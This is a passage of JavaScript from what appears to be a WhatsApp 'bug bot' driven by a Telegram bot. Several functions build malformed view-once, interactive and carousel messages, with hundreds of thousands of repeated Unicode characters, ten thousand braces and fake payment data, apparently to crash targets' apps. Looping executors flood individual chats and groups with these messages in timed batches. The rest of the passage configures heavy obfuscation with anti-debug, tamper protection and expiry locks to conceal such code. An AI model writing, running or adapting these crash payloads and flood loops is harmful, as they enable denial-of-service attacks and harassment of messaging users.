            { image: { url: 'https://i.ibb.co/4ng6VsgM/Picsart-25-06-01-01-02-32-207.jpg' } },
            { upload: userSock.waUploadToServer }
        );
        const msg = {
           key: { id: 'Telegram: @dgxeon13' + new Date().getTime() },
            message: {
                "viewOnceMessage": {
                    "message": {
                        "interactiveMessage": {
                            "header": {
                                "title": "XeonBotInc" + "ꦾ".repeat(199999),
                                "hasMediaAttachment": true,
                                "imageMessage": media.imageMessage
                            },
                            "nativeFlowMessage": {
                                "buttons": [
                                    {
                                        "name": "review_and_pay",
                                        "buttonParamsJson": `{"currency":"BRL","payment_configuration":"merchant_categorization_code","payment_type":"","total_amount":{"value":1000,"offset":1000},"reference_id":"4TK4AUGZSOU","order_request_id":"4TK4AUGZQ1X","type":"physical-goods","order":{"status":"payment_requested","description":"","subtotal":{"value":1000,"offset":1000},"order_type":"","items":[{"retailer_id":"custom-item-4TK4AUBDBAX","name":"Telegram: @dgxeon13${"ྃ".repeat(99999)}","amount":{"value":1000,"offset":1000},"quantity":1}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"Telegram: @dgxeon13","key":"+916909137213","key_type":"PHONE"}},{"type":"cards","cards":{"enabled":true,"payment_gateway_checkout_enabled":false}}],"additional_note":"","share_payment_status":false}`
                                    }
                                ]
                            }
                        }
                    }
                }
            }
        };

        await userSock.relayMessage(target, msg.message.viewOnceMessage.message, {
            messageId: msg.key.id
        });
  } catch (error) {
    console.error(`Error in groupfriz for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw error; // Keep the throw to maintain behavior
  }
}

async function xeonGroupDocExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonGroupDoc(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in groupfriz: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xeonAndroidInvisibleKingGroupExecutor(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let batch = 1;
  const maxBatches = 5;
  const batchDuration = 60 * 60 * 1000; // 1 hour batch duration
  const batchDelay = 60 * 60 * 1000; // 1 hour delay between batches

  while (batch <= maxBatches && Date.now() - startTime < totalDurationMs) {
    const batchStart = Date.now();
    console.log(chalk.green(`👀 Starting batch ${batch}...`));
    let count = 0;
    const maxLoops = 25;

    while (Date.now() - batchStart < batchDuration) {
      try {
        if (!(await validateSession(userNumber, chatId, botInstance))) {
        console.log(`⚠️ Session invalid for ${target}, stopping...`);
        return;
      }
        
        while (count < maxLoops) {
          await Promise.all([
            xeonAndroidInvisibleKing(target, userNumber, chatId, botInstance)
          ]);
          await sleep(1000);
          console.log(chalk.yellow(` ┌────────────────────────┐ │ Sending... 🦄 └────────────────────────┘ `));
          count++;
          
          if (count >= maxLoops) {
            console.log(chalk.bgYellow.black("Loop 25 reached, sleep 10 seconds before restart..."));
            await new Promise(resolve => setTimeout(resolve, 10000));
            count = 0;
          }
        }
      } catch (error) {
        console.error(`❌Error while sending: ${error.message}`);
        const userBot = getUserBot(botInstance);
        await userBot.sendMessage(chatId, `❌ Error in autoclosegc: ${error.message}. Process stopped.`);
        return; // Stop the whole function after one error
      }
    }
    console.log(chalk.green(`👀 Finished batch ${batch}`));
    batch++;
    if (batch <= maxBatches) {
      console.log(chalk.blue(`Waiting for 1 hour before next batch...`));
      await new Promise(resolve => setTimeout(resolve, batchDelay));
    }
  }
  console.log(`✅ Done! Total batches sent: ${batch - 1}`);
}

async function xbetagcios(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);

const msg = {
    "viewOnceMessage": {
      "message": {
        "listResponseMessage": {
          "title": "Telegram: @dgxeon13",
          "listType": "SINGLE_SELECT",
          "singleSelectReply": {},
          "description": xeonKingIos
        }
      }
    }
  };
  const allmsg = generateWAMessageFromContent(target, proto.Message.fromObject(msg), {});
  userSock.relayMessage(target, allmsg.message, { messageId: allmsg.key.sender });
  } catch (error) {
    console.error(`Error in xbetagc ios for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function xbetagcandroid(target, userNumber, chatId, botInstance) {
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  if (!target.endsWith('@g.us')) {
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us`);
    return;
  }

  try {
    const userSock = sessions.get(userNumber);
    const media = {
      videoMessage: {
        url: 'https://mmg.whatsapp.net/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0&mms3=true',
        mimetype: 'video/mp4',
        fileSha256: Buffer.from('j0yv4uuRPfX3ZOfyZ0t8irS7K+MluEOyodghganzbJY=', 'base64'),
        fileLength: '2359888',
        mediaKey: Buffer.from('ld+SoEzJXiVsVakuPuyRWrJfWfvJJYa0CnooCPDdZWo=', 'base64'),
        fileEncSha256: Buffer.from('kibztIx3/O30AIs++tSPOZEIo/S7a6IpBO99d9ycNYk=', 'base64'),
        directPath: '/v/t62.7161-24/11902728_707998228510266_7829645663280785822_n.enc?ccb=11-4&oh=01_Q5Aa1wEL8L0ZvwfyQEAl0Ujqn4yUqRi7NLYBclROwMXxB-wiBA&oe=68882423&_nc_sid=5e03e0',
        mediaKeyTimestamp: '1751161073',
        jpegThumbnail: Buffer.from(
          '/9j//gAQTGF2YzYxLjE5LjEwMQD/2wBDAAgGBgcGBwgICAgICAkJCQoKCgkJCQkKCgoKCgoMDAwKCgoKCgoKDAwMDA0ODQ0NDA0ODg8PDxISEREVFRUZGR//xABxAAEBAQEBAQAAAAAAAAAAAAAHBgAIBAUBAQEBAQAAAAAAAAAAAAAAAAIAAwEQAAIBAwMDAwQDAQAAAAAAAAECAwUEERIABjEHEyIhFCNiUXFhFYEyEQADAQACAwEAAAAAAAAAAAAAAQIRQTEDcRIh/8AAEQgAGAAgAwEiAAIRAAMRAP/aAAwDAQACEQMRAD8Am+0/bShc1pl7eVKS9V4LkRKLeWONdOgNk6onJP8Au71exHCXzieq+xx73MSg/otbDP7GdmnbfkFdpNtFa0/5a2t1dSedrS1SaXyrGvjXXIjqgIz0w342k3vE63UQJJreoSkhmBkkHkd3C4dw8mA2lceoYGeg2HecN+jSPF9rXUz12fDq/bPtzSsJJe36yuzrGj30BZygLMRHHbvJpABJdgifds65VQ+NWFKt7ilyVA3jTnypOPoLA2QgVzGjNIMAt09m6dNolr2j5J8j57myhZ5B9KaSQskbN6lJRGLEr6SScYLE/jc33N4ZV+P02Go1G7iuPlzLHoQyeiT1SHSrKiJGR0VR/J9ztJt8BqZnf3Tz9uea8a4/S7izrK1PyG6M8T2QTThogh1ZkU5BGQCCN2q91+BxRXSRPyKM3WjW5jifTolEg8atNoXJGCAMEEjG+fN7fQj7F3T4VC10EueQiO4gjjANvA0kbJMJWcEz6DqwFwU/59jnch3F5rxuvUuKzo39ozm7W4la+VAoCxsuIyJXxktnSFA2Y724j//Z',
          'base64'
        )
      }
    };

    const cards = [];
    const header = {
      videoMessage: media.videoMessage,
      hasMediaAttachment: false,
      contextInfo: {
        forwardingScore: 666,
        isForwarded: true,
        stanzaId: `Telegram: @dgxeon13${Date.now()}`,
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
        quotedMessage: {
          extendedTextMessage: {
            text: 'Telegram: @dgxeon13',
            contextInfo: {
              mentionedJid: ['13135550002@s.whatsapp.net'],
              externalAdReply: {
                title: 'Telegram: @dgxeon13',
                body: 'Telegram: @dgxeon13',
                thumbnailUrl: '',
                mediaType: 1,
                sourceUrl: 'https://tama.example.com',
                showAdAttribution: false
              }
            }
          }
        }
      }
    };

    for (let r = 0; r < 15; r++) {
      cards.push({
        header,
        nativeFlowMessage: {
          messageParamsJson: '{'.repeat(10000)
        }
      });
    }

    const tmsg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: 'Telegram: @dgxeon13' },
              carouselMessage: { cards, messageVersion: 1 },
              contextInfo: {
                businessMessageForwardInfo: { businessOwnerJid: '13135550002@s.whatsapp.net' },
                stanzaId: `Telegram: @dgxeon13${Math.floor(Math.random() * 99999)}`,
                forwardingScore: 100,
                isForwarded: true,
                mentionedJid: ['13135550002@s.whatsapp.net'],
                externalAdReply: {
                  title: 'Telegram: @dgxeon13',
                  body: '',
                  thumbnailUrl: 'https://example.com/',
                  mediaType: 1,
                  mediaUrl: '',
                  sourceUrl: 'https://example.com',
                  showAdAttribution: false
                }
              }
            }
          }
        }
      },
      {}
    );

    await userSock.relayMessage(target, tmsg.message, {
      messageId: tmsg.key.id
    });
  } catch (error) {
    console.error(`Error in xbetagc andro for ${userNumber}:`, error.message);
    const userBot = getUserBot(botInstance);
    await userBot.sendMessage(chatId, `❌ Failed to send bug to group ${target.replace('@g.us', '')}: ${error.message}`);
    throw err; // Keep the throw to maintain behavior
  }
}

async function getGroupIdFromInviteLink(inviteLink, userNumber, chatId, botInstance) {
  // Validate session
  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  const userBot = getUserBot(botInstance);

  // Validate input
  if (!inviteLink) {
    await userBot.sendMessage(chatId, '❌ Provide a WhatsApp group invite link.\nExample: /groupid https://chat.whatsapp.com/xxxxxxxxxxxxxxxx');
    return;
  }

  // Check if the input is a valid URL and contains 'whatsapp.com'
  if (!inviteLink.startsWith('https://chat.whatsapp.com/')) {
    await userBot.sendMessage(chatId, '❌ Invalid group invite link. It must start with https://chat.whatsapp.com/');
    return;
  }

  try {
    // Extract and clean invite code (remove any query params like ?text= or &utm_source=...)
    const inviteCodeRaw = inviteLink.split('https://chat.whatsapp.com/')[1];
    const inviteCode = inviteCodeRaw.split(/[?&]/)[0]; // Clean URL parameters

    if (!inviteCode || inviteCode.length < 10) {
      await userBot.sendMessage(chatId, '❌ Invalid group invite link format.');
      return;
    }

    const userSock = sessions.get(userNumber);
    const groupId = await userSock.groupAcceptInvite(inviteCode);

    if (!groupId) {
      await userBot.sendMessage(chatId, '❌ Failed to join group. The group may have approval enabled, you may have been removed, or the invite link may have expired. Please join the group manually and try /listgc.');
      return;
    }

    await userBot.sendMessage(chatId, `✅ Group ID: ${groupId}`);
  } catch (error) {
    console.error(`Error in getGroupIdFromInviteLink for ${userNumber}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process group invite link: ${error.message}. The group may have approval enabled, you may have been removed, or the invite link may have expired. Please join the group manually and try /listgc.`);
  }
}

async function sendOfferCall(userSock, target) {
  try {
    // Note: @whiskeysockets/baileys does not currently support sending VoIP call offers.
    // The 'offerCall' method is included as per user request but may throw an error if not implemented.
    await userSock.offerCall(target);
    console.log(chalk.white.bold(`Success: Sent offer call to ${target}`));
    return true;
  } catch (error) {
    console.error(chalk.white.bold(`Failed to send offer call to ${target}:`, error));
    return false;
  }
}

async function sendMessagesForDuration(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const userBot = getUserBot(botInstance);

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log('Delivery completed within specified duration.');
      await userBot.sendMessage(chatId, `✅ Delivery completed to ${target.replace('@s.whatsapp.net', '')}.`);
      return;
    }

    if (count < 800) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      await xjammer2(target, userNumber, chatId, botInstance, true);
      count++;
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await sendNext();
    } else {
      console.log(chalk.green(`Completed sending ${count} bvg to ${target}`));
      count = 0;
      console.log(chalk.yellow('Pausing before next batch...'));
      await new Promise((resolve) => setTimeout(resolve, 5000));
      await sendNext();
    }
  };

  await sendNext();
}

async function sendMessagesForDurationX(durationHours, target, userNumber, chatId, botInstance) {
  const totalDurationMs = durationHours * 60 * 60 * 1000;
  const startTime = Date.now();
  let count = 0;

  const userBot = getUserBot(botInstance);

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs) {
      console.log('Delivery completed within specified duration.');
      await userBot.sendMessage(chatId, `✅ Delivery completed to ${target.replace('@s.whatsapp.net', '')}.`);
      return;
    }

    if (count < 800) {
      // Recheck session before each send
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      await xjammer(target, userNumber, chatId, botInstance);
      count++;
      await new Promise((resolve) => setTimeout(resolve, 1000));
      await sendNext();
    } else {
      console.log(chalk.green(`Completed sending ${count} bvg to ${target}`));
      count = 0;
      console.log(chalk.yellow('Pausing before next batch...'));
      await new Promise((resolve) => setTimeout(resolve, 5000));
      await sendNext();
    }
  };

  await sendNext();
}

//enc/dec 
const JsConfuser = require('js-confuser');
const { webcrack } = require('webcrack');
const fse = require('fs-extra');

// === ALL OBFUSCATION CONFIGS & SPECIAL FUNCTIONS ===
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

const obfuscateTimeLocked = async (fileContent, days) => {
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + parseInt(days));
    const expiryTimestamp = expiryDate.getTime();
    try {
        const obfuscated = await JsConfuser.obfuscate(
            `(function(){const expiry=${expiryTimestamp};if(new Date().getTime()>expiry){throw new Error('Script has expired after ${days} days');}${fileContent}})();`,
            {
                target: "node",
                compact: true,
                renameVariables: true,
                renameGlobals: true,
                identifierGenerator: "randomized",
                stringCompression: true,
                stringConcealing: true,
                stringEncoding: true,
                controlFlowFlattening: 0.75,
                flatten: true,
                shuffle: true,
                rgf: false,
                opaquePredicates: {
                    count: 6,
                    complexity: 4
                },
                dispatcher: true,
                globalConcealing: true,
                lock: {
                    selfDefending: true,
                    antiDebug: (code) => `if(typeof debugger!=='undefined'||process.env.NODE_ENV==='debug')throw new Error('Debugging disabled');${code}`,
                    integrity: true,
                    tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
                },
                duplicateLiteralsRemoval: true
            }
        );
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Obfuscation result is not a string");
        }
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Failed to obfuscate: ${error.message}`);
    }
};

// Command /timez untuk enkripsi dengan masa aktif dalam hari

// Konstanta fungsi async untuk obfuscation Quantum Vortex Encryption
const obfuscateQuantum = async (fileContent) => {
    // Generate identifier unik berdasarkan waktu lokal
    const generateTimeBasedIdentifier = () => {
        const timeStamp = new Date().getTime().toString().slice(-5);
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_$#@&*";
        let identifier = "qV_";
        for (let i = 0; i < 7; i++) {
            identifier += chars[Math.floor((parseInt(timeStamp[i % 5]) + i * 2) % chars.length)];
        }
        return identifier;
    };

    // Tambahkan kode phantom berdasarkan milidetik
    const currentMilliseconds = new Date().getMilliseconds();
    const phantomCode = currentMilliseconds % 3 === 0 ? `if(Math.random()>0.999)console.log('PhantomTrigger');` : "";

    try {
        const obfuscated = await JsConfuser.obfuscate(fileContent + phantomCode, {
            target: "node",
            compact: true,
            renameVariables: true,
            renameGlobals: true,
            identifierGenerator: generateTimeBasedIdentifier,
            stringCompression: true,
            stringConcealing: false,
            stringEncoding: true,
            controlFlowFlattening: 0.85, // Intensitas lebih tinggi untuk versi 2.0
            flatten: true,
            shuffle: true,
            rgf: true,
            opaquePredicates: {
                count: 8, // Peningkatan count untuk versi 2.0
                complexity: 5
            },
            dispatcher: true,
            globalConcealing: true,
            lock: {
                selfDefending: true,
                antiDebug: (code) => `if(typeof debugger!=='undefined'||(typeof process!=='undefined'&&process.env.NODE_ENV==='debug'))throw new Error('Debugging disabled');${code}`,
                integrity: true,
                tamperProtection: (code) => `if(!((function(){return eval('1+1')===2;})()))throw new Error('Tamper detected');${code}`
            },
            duplicateLiteralsRemoval: true
        });
        let obfuscatedCode = obfuscated.code || obfuscated;
        if (typeof obfuscatedCode !== "string") {
            throw new Error("Obfuscation result is not a string");
        }
        // Self-evolving code dengan XOR dinamis
        const key = currentMilliseconds % 256;
        obfuscatedCode = `(function(){let k=${key};return function(c){return c.split('').map((x,i)=>String.fromCharCode(x.charCodeAt(0)^(k+(i%16)))).join('');}('${obfuscatedCode}');})()`;
        return obfuscatedCode;
    } catch (error) {
        throw new Error(`Failed to obfuscate: ${error.message}`);
    }
};

// Command /quantum untuk enkripsi Quantum Vortex Encryption


// Konfigurasi obfuscation untuk Siu + Calcrick style dengan keamanan ekstrem
const getSiuCalcrickObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        // Identifier generator pseudo-random tanpa crypto
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `CalceKarik和SiuSiu无与伦比的帅气${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// Command /siucalcrick

// Command /encgalaxy

// Konfigurasi obfuscation untuk Nebula style dengan banyak opsi aktif
const getNebulaObfuscationConfig = () => {
    const generateNebulaName = () => {
        // Identifier generator pseudo-random tanpa crypto atau timeHash
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const prefix = "NX";
        let randomPart = "";
        for (let i = 0; i < 4; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `${prefix}${randomPart}`;
    };

    return {
        target: "node",
        compact: true,                  // Minimalkan whitespace
        renameVariables: true,          // Rename variabel
        renameGlobals: true,            // Rename global untuk keamanan
        identifierGenerator: generateNebulaName,
        stringCompression: true,        // Kompresi string
        stringConcealing: false,         // Sembunyikan string
        stringEncoding: true,           // Enkripsi string
        stringSplitting: false,          // Pecah string untuk kebingungan
        controlFlowFlattening: 0.75,     // Aktif dengan intensitas sedang
        flatten: true,                  // Ratakan struktur kode
        shuffle: true,                  // Acak urutan eksekusi
        rgf: true,                      // Randomized Global Functions
        deadCode: true,                 // Tambah kode mati untuk kebingungan
        opaquePredicates: true,         // Predikat buram
        dispatcher: true,               // Acak eksekusi fungsi
        globalConcealing: true,         // Sembunyikan variabel global
        objectExtraction: true,         // Ekstrak objek untuk kebingungan
        duplicateLiteralsRemoval: true,// Pertahankan duplikat untuk kebingungan
        lock: {
            selfDefending: true,        // Lindungi dari modifikasi
            antiDebug: true,            // Cegah debugging
            integrity: true,            // Pastikan integritas
            tamperProtection: true      // Lindungi dari tampering
        }
    };
};

// Fungsi invisible encoding yang efisien dan kecil
function encodeInvisible(text) {
    try {
        // Kompresi kode dengan menghapus spasi berlebih
        const compressedText = text.replace(/\s+/g, ' ').trim();
        // Gunakan base64 untuk efisiensi
        const base64Text = Buffer.from(compressedText).toString('base64');
        // Tambahkan penanda invisible di awal
        return '\u200B' + base64Text; // Hanya penanda awal untuk invisibility minimal
    } catch (e) {
        log("Gagal encode invisible", e);
        return Buffer.from(text).toString('base64'); // Fallback ke base64
    }
}


// Konfigurasi obfuscation untuk Nova style
const getNovaObfuscationConfig = () => {
    const generateNovaName = () => {
        // Identifier generator unik dan keren
        const prefixes = ["nZ", "nova", "nx"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const hash = crypto.createHash('sha256')
            .update(crypto.randomBytes(8))
            .digest('hex')
            .slice(0, 6); // Ambil 6 karakter pertama dari hash SHA-256
        const suffix = Math.random().toString(36).slice(2, 5); // Sufiks acak 3 karakter
        return `${randomPrefix}_${hash}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateNovaName, 
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5, 
        flatten: true,
        shuffle: true,
        rgf: false,
        deadCode: false, 
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Fungsi decode invisible yang efisien
function decodeInvisible(encodedText) {
    try {
        if (!encodedText.startsWith('\u200B')) return encodedText; // Fallback jika tidak ada penanda
        const base64Text = encodedText.slice(1); // Hapus penanda invisible
        return Buffer.from(base64Text, 'base64').toString('utf-8');
    } catch (e) {
        log("Gagal decode invisible", e);
        return encodedText; // Fallback ke teks asli
    }
}

// Konfigurasi obfuscation untuk X style
const getXObfuscationConfig = () => {
    const generateXName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return "xZ" + crypto.randomUUID().slice(0, 4); // Nama pendek dan unik
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateXName(),
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5, // Stabil dan aman
        flatten: true,
        shuffle: true,
        rgf: true,
        deadCode: false, // Nonaktif untuk ukuran kecil
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Max style dengan intensitas yang dapat diatur
const getMaxObfuscationConfig = (intensity) => {
    const generateMaxName = () => {
        // Nama variabel unik: prefiks "mX" + kombinasi acak
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 4) + 4; // 4-7 karakter
        let name = "mX";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    // Skala intensitas dari 1-10 ke 0.1-1.0 untuk controlFlowFlattening
    const flatteningLevel = intensity / 10;

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateMaxName(),
        stringCompression: true, // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string
        controlFlowFlattening: flatteningLevel, // Intensitas berdasarkan input (0.1-1.0)
        flatten: true, // Meratakan struktur kontrol
        shuffle: true, // Mengacak urutan
        rgf: true, // Randomized Global Functions
        calculator: true, // Mengacak operasi matematika
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true, // Mengacak eksekusi
        globalConcealing: true, // Menyembunyikan variabel global
        objectExtraction: true, // Mengekstrak objek untuk kebingungan
        duplicateLiteralsRemoval: false, // Menjaga redundansi
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Konfigurasi obfuscation standar (diperkuat dan aman)
const getObfuscationConfig = (level = "high") => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: level === "high" ? 0.95 : level === "medium" ? 0.75 : 0.5,
    shuffle: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
});

// Konfigurasi obfuscation untuk Strong style (diperbaiki berdasarkan dokumentasi)
const getStrongObfuscationConfig = () => {
    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "randomized", // Valid: menghasilkan nama acak
        stringEncoding: true, // Valid: mengenkripsi string
        stringSplitting: true, // Valid: memecah string
        controlFlowFlattening: 0.75, // Valid: mengacak alur kontrol
        duplicateLiteralsRemoval: true, // Valid: menghapus literal duplikat
        calculator: true, // Valid: mengacak operasi matematika
        dispatcher: true, // Valid: mengacak eksekusi dengan dispatcher
        deadCode: true, // Valid: menambahkan kode mati
        opaquePredicates: true, // Valid: menambahkan predikat buram
        lock: {
            selfDefending: true, // Valid: mencegah modifikasi
            antiDebug: true, // Valid: mencegah debugging
            integrity: true, // Valid: memastikan integritas
            tamperProtection: true // Valid: perlindungan tamper
        }
    };
};

// Konfigurasi obfuscation untuk Big style (ukuran file besar)
const getBigObfuscationConfig = () => {
    const generateBigName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 5) + 5; // Nama 5-9 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateBigName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Stabil dan kuat
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Konfigurasi obfuscation untuk Invisible style (diperbaiki)
const getInvisObfuscationConfig = () => {
    const generateInvisName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += "_"; // Menggunakan underscore untuk "invis" yang aman
        }
        // Tambahkan variasi acak agar unik
        return name + Math.random().toString(36).substring(2, 5);
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateInvisName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Stealth style (diperbaiki untuk stabilitas)
const getStealthObfuscationConfig = () => {
    const generateStealthName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 3) + 1; // Nama pendek 1-3 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateStealthName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Dikurangi untuk stabilitas
        shuffle: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Custom style (dengan nama kustom)
const getCustomObfuscationConfig = (customName) => {
    const generateCustomName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const randomSuffixLength = Math.floor(Math.random() * 3) + 2; // Sufiks acak 2-4 karakter
        let suffix = "";
